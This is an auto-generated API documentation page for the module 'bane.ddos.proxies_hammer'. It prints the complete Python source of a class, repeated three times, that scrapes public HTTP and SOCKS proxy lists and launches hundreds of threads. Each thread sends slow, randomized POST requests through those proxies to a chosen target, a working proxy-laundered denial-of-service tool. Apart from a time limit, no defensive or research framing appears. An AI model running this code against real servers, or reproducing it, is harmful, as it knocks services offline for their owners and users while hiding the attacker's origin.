<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
<meta name="generator" content="pdoc 0.10.0" />
<title>bane.ddos.proxies_hammer API documentation</title>
<meta name="description" content="" />
<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/sanitize.min.css" integrity="sha256-PK9q560IAAa6WVRRh76LtCaI8pjTJ2z11v0miyNNjrs=" crossorigin>
<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/typography.min.css" integrity="sha256-7l/o7C8jubJiy74VsKTidCy1yBkRtiUGbVkYBylBqUg=" crossorigin>
<link rel="stylesheet preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/github.min.css" crossorigin>
<style>:root{--highlight-color:#fe9}.flex{display:flex !important}body{line-height:1.5em}#content{padding:20px}#sidebar{padding:30px;overflow:hidden}#sidebar > *:last-child{margin-bottom:2cm}.http-server-breadcrumbs{font-size:130%;margin:0 0 15px 0}#footer{font-size:.75em;padding:5px 30px;border-top:1px solid #ddd;text-align:right}#footer p{margin:0 0 0 1em;display:inline-block}#footer p:last-child{margin-right:30px}h1,h2,h3,h4,h5{font-weight:300}h1{font-size:2.5em;line-height:1.1em}h2{font-size:1.75em;margin:1em 0 .50em 0}h3{font-size:1.4em;margin:25px 0 10px 0}h4{margin:0;font-size:105%}h1:target,h2:target,h3:target,h4:target,h5:target,h6:target{background:var(--highlight-color);padding:.2em 0}a{color:#058;text-decoration:none;transition:color .3s ease-in-out}a:hover{color:#e82}.title code{font-weight:bold}h2[id^="header-"]{margin-top:2em}.ident{color:#900}pre code{background:#f8f8f8;font-size:.8em;line-height:1.4em}code{background:#f2f2f1;padding:1px 4px;overflow-wrap:break-word}h1 code{background:transparent}pre{background:#f8f8f8;border:0;border-top:1px solid #ccc;border-bottom:1px solid #ccc;margin:1em 0;padding:1ex}#http-server-module-list{display:flex;flex-flow:column}#http-server-module-list div{display:flex}#http-server-module-list dt{min-width:10%}#http-server-module-list p{margin-top:0}.toc ul,#index{list-style-type:none;margin:0;padding:0}#index code{background:transparent}#index h3{border-bottom:1px solid #ddd}#index ul{padding:0}#index h4{margin-top:.6em;font-weight:bold}@media (min-width:200ex){#index .two-column{column-count:2}}@media (min-width:300ex){#index .two-column{column-count:3}}dl{margin-bottom:2em}dl dl:last-child{margin-bottom:4em}dd{margin:0 0 1em 3em}#header-classes + dl > dd{margin-bottom:3em}dd dd{margin-left:2em}dd p{margin:10px 0}.name{background:#eee;font-weight:bold;font-size:.85em;padding:5px 10px;display:inline-block;min-width:40%}.name:hover{background:#e0e0e0}dt:target .name{background:var(--highlight-color)}.name > span:first-child{white-space:nowrap}.name.class > span:nth-child(2){margin-left:.4em}.inherited{color:#999;border-left:5px solid #eee;padding-left:1em}.inheritance em{font-style:normal;font-weight:bold}.desc h2{font-weight:400;font-size:1.25em}.desc h3{font-size:1em}.desc dt code{background:inherit}.source summary,.git-link-div{color:#666;text-align:right;font-weight:400;font-size:.8em;text-transform:uppercase}.source summary > *{white-space:nowrap;cursor:pointer}.git-link{color:inherit;margin-left:1em}.source pre{max-height:500px;overflow:auto;margin:0}.source pre code{font-size:12px;overflow:visible}.hlist{list-style:none}.hlist li{display:inline}.hlist li:after{content:',\2002'}.hlist li:last-child:after{content:none}.hlist .hlist{display:inline;padding-left:1em}img{max-width:100%}td{padding:0 .5em}.admonition{padding:.1em .5em;margin-bottom:1em}.admonition-title{font-weight:bold}.admonition.note,.admonition.info,.admonition.important{background:#aef}.admonition.todo,.admonition.versionadded,.admonition.tip,.admonition.hint{background:#dfd}.admonition.warning,.admonition.versionchanged,.admonition.deprecated{background:#fd4}.admonition.error,.admonition.danger,.admonition.caution{background:lightpink}</style>
<style media="screen and (min-width: 700px)">@media screen and (min-width:700px){#sidebar{width:30%;height:100vh;overflow:auto;position:sticky;top:0}#content{width:70%;max-width:100ch;padding:3em 4em;border-left:1px solid #ddd}pre code{font-size:1em}.item .name{font-size:1em}main{display:flex;flex-direction:row-reverse;justify-content:flex-end}.toc ul ul,#index ul{padding-left:1.5em}.toc > ul > li{margin-top:.5em}}</style>
<style media="print">@media print{#sidebar h1{page-break-before:always}.source{display:none}}@media print{*{background:transparent !important;color:#000 !important;box-shadow:none !important;text-shadow:none !important}a[href]:after{content:" (" attr(href) ")";font-size:90%}a[href][title]:after{content:none}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}@page{margin:0.5cm}p,h2,h3{orphans:3;widows:3}h1,h2,h3,h4,h5,h6{page-break-after:avoid}}</style>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js" integrity="sha256-Uv3H6lx7dJmRfRvH8TH6kJD1TSK1aFcwgx+mdg3epi8=" crossorigin></script>
<script>window.addEventListener('DOMContentLoaded', () => hljs.initHighlighting())</script>
</head>
<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.ddos.proxies_hammer</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">from bane.ddos.utils import *

class prox_hammer(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        cookie=None,
        user_agents=None,
        threads_daemon=True,
        scraping_timeout=15,
        max_content=15000,
        min_content=10000,
        threads=700,
        timeout=5,
        http_list=None,
        socks4_list=None,
        socks5_list=None,
        duration=60,
        logs=True,
    ):
        self.cookie = cookie
        self.user_agents = user_agents
        if not self.user_agents or len(self.user_agents) == 0:
            self.user_agents = ua
        self.httplist = http_list
        if not self.httplist and self.httplist != []:
            self.httplist = proxyscrape(timeout=scraping_timeout)
        self.socks4list = socks4_list
        if not self.socks4list and self.socks4list != []:
            self.socks4list = proxyscrape(protocol=&#39;socks4&#39;,timeout=scraping_timeout)
        self.socks5list = socks5_list
        if not self.socks5list and self.socks5list != []:
            self.socks5list = proxyscrape(protocol=&#39;socks5&#39;,timeout=scraping_timeout)
        self.stop = False
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.max_content = max_content
        self.min_content = min_content
        self.logs = logs
        self.counter = 0
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) &gt;= self.duration
                ):  # this is a safety mechanism so the attack won&#39;t run forever
                    break
                if self.stop == True:
                    break
                try:
                    bot_type = []
                    if len(self.httplist) &gt; 0:
                        bot_type.append(&#34;h&#34;)
                    if len(self.socks4list) &gt; 0:
                        bot_type.append(&#34;s4&#34;)
                    if len(self.socks5list) &gt; 0:
                        bot_type.append(&#34;s5&#34;)
                    z = random.choice(bot_type)
                    if z == &#34;h&#34;:
                        line = random.choice(self.httplist)
                    elif z == &#34;s4&#34;:
                        line = random.choice(self.socks4list)
                    elif z == &#34;s5&#34;:
                        line = random.choice(self.socks5list)
                    ipp = line.split(&#34;:&#34;)[0].split(&#34;=&#34;)[0]
                    pp = line.split(&#34;:&#34;)[1].split(&#34;=&#34;)[0]
                    s = socks.socksocket()
                    if z == &#34;h&#34;:
                        s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
                    elif z == &#34;s4&#34;:
                        s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
                    elif z == &#34;s5&#34;:
                        s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
                    if z == &#34;h&#34;:
                        s.settimeout(self.timeout)
                    s.connect((self.target, self.port))
                    self.counter += 1
                    if (self.port == 443) or (self.port == 8443):
                        s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
                    q = random.randint(self.min_content, self.max_content)
                    ck = &#34;&#34;
                    if self.cookie:
                        ck = &#34;Cookie: &#34; + self.cookie + &#34;\r\n&#34;
                    s.send(
                        reorder_headers_randomly(
                            &#34;POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n&#34;.format(
                                random.choice(paths),
                                ck,
                                random.choice(self.user_agents),
                                random.randint(300, 1000),
                                q,
                                (
                                    random.choice(referers)
                                    + random.choice(lis)
                                    + str(random.randint(0, 100000000))
                                    + random.choice(lis)
                                ),
                                self.target,
                            )
                        ).encode(&#34;utf-8&#34;)
                    )
                    for i in range(q):
                        if (
                            int(time.time() - self.start) &gt;= self.duration
                        ):  # this is a safety mechanism so the attack won&#39;t run forever
                            break
                        if self.stop == True:
                            break
                        h = random.choice(lis)
                        try:
                            s.send(h.encode(&#34;utf-8&#34;))
                            if self.logs == True:
                                sys.stdout.write(&#34;\rPosted: {} --&gt; {}&#34;.format(h, ipp))
                                sys.stdout.flush()
                                # print(&#34;Posted: {} --&gt; {}&#34;.format(h,ipp))
                            time.sleep(random.uniform(0.1, 3))
                        except:
                            break
                    s.close()
                except:
                    pass
                self.counter -= 1
                time.sleep(0.1)
            self.kill()
        except:
            pass</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="bane.ddos.proxies_hammer.prox_hammer"><code class="flex name class">
<span>class <span class="ident">prox_hammer</span></span>
<span>(</span><span>u, p=80, cookie=None, user_agents=None, threads_daemon=True, scraping_timeout=15, max_content=15000, min_content=10000, threads=700, timeout=5, http_list=None, socks4_list=None, socks5_list=None, duration=60, logs=True)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class prox_hammer(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        cookie=None,
        user_agents=None,
        threads_daemon=True,
        scraping_timeout=15,
        max_content=15000,
        min_content=10000,
        threads=700,
        timeout=5,
        http_list=None,
        socks4_list=None,
        socks5_list=None,
        duration=60,
        logs=True,
    ):
        self.cookie = cookie
        self.user_agents = user_agents
        if not self.user_agents or len(self.user_agents) == 0:
            self.user_agents = ua
        self.httplist = http_list
        if not self.httplist and self.httplist != []:
            self.httplist = proxyscrape(timeout=scraping_timeout)
        self.socks4list = socks4_list
        if not self.socks4list and self.socks4list != []:
            self.socks4list = proxyscrape(protocol=&#39;socks4&#39;,timeout=scraping_timeout)
        self.socks5list = socks5_list
        if not self.socks5list and self.socks5list != []:
            self.socks5list = proxyscrape(protocol=&#39;socks5&#39;,timeout=scraping_timeout)
        self.stop = False
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.max_content = max_content
        self.min_content = min_content
        self.logs = logs
        self.counter = 0
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) &gt;= self.duration
                ):  # this is a safety mechanism so the attack won&#39;t run forever
                    break
                if self.stop == True:
                    break
                try:
                    bot_type = []
                    if len(self.httplist) &gt; 0:
                        bot_type.append(&#34;h&#34;)
                    if len(self.socks4list) &gt; 0:
                        bot_type.append(&#34;s4&#34;)
                    if len(self.socks5list) &gt; 0:
                        bot_type.append(&#34;s5&#34;)
                    z = random.choice(bot_type)
                    if z == &#34;h&#34;:
                        line = random.choice(self.httplist)
                    elif z == &#34;s4&#34;:
                        line = random.choice(self.socks4list)
                    elif z == &#34;s5&#34;:
                        line = random.choice(self.socks5list)
                    ipp = line.split(&#34;:&#34;)[0].split(&#34;=&#34;)[0]
                    pp = line.split(&#34;:&#34;)[1].split(&#34;=&#34;)[0]
                    s = socks.socksocket()
                    if z == &#34;h&#34;:
                        s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
                    elif z == &#34;s4&#34;:
                        s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
                    elif z == &#34;s5&#34;:
                        s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
                    if z == &#34;h&#34;:
                        s.settimeout(self.timeout)
                    s.connect((self.target, self.port))
                    self.counter += 1
                    if (self.port == 443) or (self.port == 8443):
                        s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
                    q = random.randint(self.min_content, self.max_content)
                    ck = &#34;&#34;
                    if self.cookie:
                        ck = &#34;Cookie: &#34; + self.cookie + &#34;\r\n&#34;
                    s.send(
                        reorder_headers_randomly(
                            &#34;POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n&#34;.format(
                                random.choice(paths),
                                ck,
                                random.choice(self.user_agents),
                                random.randint(300, 1000),
                                q,
                                (
                                    random.choice(referers)
                                    + random.choice(lis)
                                    + str(random.randint(0, 100000000))
                                    + random.choice(lis)
                                ),
                                self.target,
                            )
                        ).encode(&#34;utf-8&#34;)
                    )
                    for i in range(q):
                        if (
                            int(time.time() - self.start) &gt;= self.duration
                        ):  # this is a safety mechanism so the attack won&#39;t run forever
                            break
                        if self.stop == True:
                            break
                        h = random.choice(lis)
                        try:
                            s.send(h.encode(&#34;utf-8&#34;))
                            if self.logs == True:
                                sys.stdout.write(&#34;\rPosted: {} --&gt; {}&#34;.format(h, ipp))
                                sys.stdout.flush()
                                # print(&#34;Posted: {} --&gt; {}&#34;.format(h,ipp))
                            time.sleep(random.uniform(0.1, 3))
                        except:
                            break
                    s.close()
                except:
                    pass
                self.counter -= 1
                time.sleep(0.1)
            self.kill()
        except:
            pass</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li><a title="bane.ddos.utils.DDoS_Class" href="utils.html#bane.ddos.utils.DDoS_Class">DDoS_Class</a></li>
</ul>
<h3>Methods</h3>
<dl>
<dt id="bane.ddos.proxies_hammer.prox_hammer.attack"><code class="name flex">
<span>def <span class="ident">attack</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def attack(self):
    try:
        time.sleep(1)
        while True:
            if (
                int(time.time() - self.start) &gt;= self.duration
            ):  # this is a safety mechanism so the attack won&#39;t run forever
                break
            if self.stop == True:
                break
            try:
                bot_type = []
                if len(self.httplist) &gt; 0:
                    bot_type.append(&#34;h&#34;)
                if len(self.socks4list) &gt; 0:
                    bot_type.append(&#34;s4&#34;)
                if len(self.socks5list) &gt; 0:
                    bot_type.append(&#34;s5&#34;)
                z = random.choice(bot_type)
                if z == &#34;h&#34;:
                    line = random.choice(self.httplist)
                elif z == &#34;s4&#34;:
                    line = random.choice(self.socks4list)
                elif z == &#34;s5&#34;:
                    line = random.choice(self.socks5list)
                ipp = line.split(&#34;:&#34;)[0].split(&#34;=&#34;)[0]
                pp = line.split(&#34;:&#34;)[1].split(&#34;=&#34;)[0]
                s = socks.socksocket()
                if z == &#34;h&#34;:
                    s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
                elif z == &#34;s4&#34;:
                    s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
                elif z == &#34;s5&#34;:
                    s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
                if z == &#34;h&#34;:
                    s.settimeout(self.timeout)
                s.connect((self.target, self.port))
                self.counter += 1
                if (self.port == 443) or (self.port == 8443):
                    s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
                q = random.randint(self.min_content, self.max_content)
                ck = &#34;&#34;
                if self.cookie:
                    ck = &#34;Cookie: &#34; + self.cookie + &#34;\r\n&#34;
                s.send(
                    reorder_headers_randomly(
                        &#34;POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n&#34;.format(
                            random.choice(paths),
                            ck,
                            random.choice(self.user_agents),
                            random.randint(300, 1000),
                            q,
                            (
                                random.choice(referers)
                                + random.choice(lis)
                                + str(random.randint(0, 100000000))
                                + random.choice(lis)
                            ),
                            self.target,
                        )
                    ).encode(&#34;utf-8&#34;)
                )
                for i in range(q):
                    if (
                        int(time.time() - self.start) &gt;= self.duration
                    ):  # this is a safety mechanism so the attack won&#39;t run forever
                        break
                    if self.stop == True:
                        break
                    h = random.choice(lis)
                    try:
                        s.send(h.encode(&#34;utf-8&#34;))
                        if self.logs == True:
                            sys.stdout.write(&#34;\rPosted: {} --&gt; {}&#34;.format(h, ipp))
                            sys.stdout.flush()
                            # print(&#34;Posted: {} --&gt; {}&#34;.format(h,ipp))
                        time.sleep(random.uniform(0.1, 3))
                    except:
                        break
                s.close()
            except:
                pass
            self.counter -= 1
            time.sleep(0.1)
        self.kill()
    except:
        pass</code></pre>
</details>
</dd>
</dl>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="bane.ddos" href="index.html">bane.ddos</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="bane.ddos.proxies_hammer.prox_hammer" href="#bane.ddos.proxies_hammer.prox_hammer">prox_hammer</a></code></h4>
<ul class="">
<li><code><a title="bane.ddos.proxies_hammer.prox_hammer.attack" href="#bane.ddos.proxies_hammer.prox_hammer.attack">attack</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>